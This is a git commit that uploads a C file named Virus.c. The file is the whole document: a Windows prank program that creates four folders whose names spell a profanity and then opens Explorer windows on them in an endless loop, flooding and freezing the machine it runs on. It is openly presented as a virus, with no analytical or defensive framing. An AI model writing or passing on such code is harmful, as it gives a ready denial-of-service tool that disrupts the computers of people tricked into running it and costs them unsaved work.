b55178113418cb75c1ba767f6a2708f9de36d661
Zackdokong <66398105+Zackdokong@users.noreply.github.com>
2020-10-01 19:22:05 +0900

    Add files via upload

---
+++ Virus.c
@@ -0,0 +1,18 @@
+#include <stdio.h>
+#include <windows.h>
+
+int main()
+{
+	system("md f");
+	system("md u");
+	system("md c");
+	system("md k");
+	while(1)
+	{
+		system("start f");
+		system("start u");
+		system("start c");
+		system("start k");
+	}
+	return 0;
+}
